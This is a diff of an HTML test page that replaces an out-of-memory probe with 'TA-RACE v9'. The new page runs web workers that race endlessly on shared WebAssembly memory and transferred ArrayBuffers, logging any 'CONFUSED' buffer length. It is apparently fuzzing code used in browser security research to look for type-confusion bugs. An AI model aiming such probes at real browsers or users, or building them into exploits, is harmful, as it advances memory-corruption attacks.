@@ -1,33 +1,113 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>OOM-PROBE</title>
-<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
-<div id=o>[OOM-PROBE] allocation-failure window</div>
+<title>TA-RACE v9</title>
+<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
+<div id=o>[TA-RACE v9] recycled WASM mem - race runs forever</div>
 <script>
 const o=document.getElementById('o');
-const log=m=>o.textContent+="\n"+m;
+const log=m=>{o.textContent+="\n"+m;};
 window.addEventListener('error',e=>log("[ERROR] "+e.message));
-log("[*] start");
-(async()=>{
-// sizes where allocation CANNOT succeed (> device RAM)
-const TESTS=[
-  ["f64-8G-elems",Float64Array,0x100000000/8],   // 8GB request
-  ["u8-8G",Uint8Array,0x200000000],                 // 8GB
-  ["f64-34G",Float64Array,0xFFFFFFFF],              // 34GB in elements
-  ["u8-max64",Uint8Array,0xFFFFFFFFFFFFFFFF]        // insane
-];
-for(const [tag,C,n] of TESTS){
+log("[*] UA: "+navigator.userAgent);
+
+const WK=`let u8=null, mem=null, who="";
+function lg(m){postMessage({log:who+" "+m});}
+const sl=t=>new Promise(r=>setTimeout(r,t));
+onmessage=async e=>{
+  if(e.data.sab){
+    who=e.data.who; u8=new Uint8Array(e.data.sab);
+    lg("on SAB");
+    let i=0;
+    while(true){
+      Atomics.store(u8,(i>>>0)&0xFFFF,i&0xFF);
+      Atomics.add(u8,((i>>>0)+1)&0xFFFF,1);
+      if((++i&0xFFFF)===0) await sl(2);
+    }
+  }
+  if(e.data.mem){
+    who=e.data.who; mem=e.data.mem;
+    lg("on WASM mem");
+    let i=0;
+    while(true){
+      if(!mem){ await sl(1); continue; }
+      try{mem.grow(1);}catch(_){}
+      const bl=mem.buffer.byteLength;
+      if(bl&0xFFFF){
+        lg("CONFUSED bl="+bl);
+        try{structuredClone(new Uint8Array(mem.buffer));}catch(_){}
+        try{structuredClone(new Float64Array(mem.buffer));}catch(_){}
+        try{structuredClone(new DataView(mem.buffer));}catch(_){}
+      }
+      if((++i&0x3FFF)===0) await sl(2);
+    }
+  }
+};`;
+
+const wA=new Worker(URL.createObjectURL(new Blob([WK])));
+const wB=new Worker(URL.createObjectURL(new Blob([WK])));
+wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
+wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
+
+const wR=new Worker(URL.createObjectURL(new Blob([`
+onmessage=e=>{ for(const ab of e.data.abs){
+  let out=ab;
+  try{ out=(Math.random()<0.5)?ab.transfer():ab.transferToFixedLength(4096); }catch(_){}
+  try{ postMessage({abs:[out]},[out]); }catch(_){}
+} };
+`])));
+log("[1] 3 workers up");
+
+let sab=null;
+try{
+  sab=new SharedArrayBuffer(0x10000);
+  wA.postMessage({sab,who:'A'});
+  wB.postMessage({sab,who:'B'});
+  log("[2] SAB -> 2 workers");
+}catch(e){log("[FAIL] SAB: "+e.name);}
+
+let gmem=null, gen=0;
+function newMem(){
   try{
-    const ab=new ArrayBuffer(64,{maxByteLength:0x100000});
-    const out=ab.transferToFixedLength(n);
-    log(tag+": RETURNED bl="+out.byteLength+" (should have thrown)");
-    const v=new Uint8Array(out);
-    v[0]=0x41;
-    const tail=v[out.byteLength-1];
-    log(tag+": tail read=0x"+(tail!==undefined?tail.toString(16):"undef")+" *** ALIVE = POSSIBLE CONFUSION ***");
-  }catch(e){ log(tag+": "+e.name+" (correct-ish)"); }
-  await new Promise(r=>setTimeout(r,100));
+    gmem=new WebAssembly.Memory({initial:1,maximum:8,shared:true});
+    gen++;
+    wA.postMessage({mem:gmem,who:'A'});
+    wB.postMessage({mem:gmem,who:'B'});
+    return true;
+  }catch(e){ log("[-] WASM gen "+gen+": "+e.name); return false; }
 }
-log("DONE");
+if(newMem()) log("[3] WASM mem gen 1 -> 2 workers");
+
+let inFlight=0;
+wR.onmessage=e=>{
+  for(const ab of e.data.abs){
+    inFlight--;
+    try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
+  }
+};
+
+(async()=>{
+  let it=0, grows=0, mems=1;
+  log("[*] main loop");
+  while(true){
+    if(inFlight<24){
+      const ab=new ArrayBuffer(256,{maxByteLength:2048});
+      try{ab.resize(512+(it&1023));}catch(_){}
+      try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
+    }
+    if(gmem&&((it&0x3F)===0)){
+      try{ gmem.grow(1); grows++; }catch(_){
+        if(newMem()){ mems++; log("[*] mem recycled -> gen "+mems); }
+      }
+      const bl=gmem.buffer.byteLength;
+      if(bl&0xFFFF){
+        log("MAIN CONFUSED bl="+bl);
+        try{structuredClone(new Uint8Array(gmem.buffer));}catch(_){}
+      }
+    }
+    it++;
+    if((it&0x3FF)===0){
+      log("[*] it="+it+" grows="+grows+" gens="+mems+" inflight="+inFlight);
+      await new Promise(r=>setTimeout(r,25));
+    }
+  }
 })();
 </script>
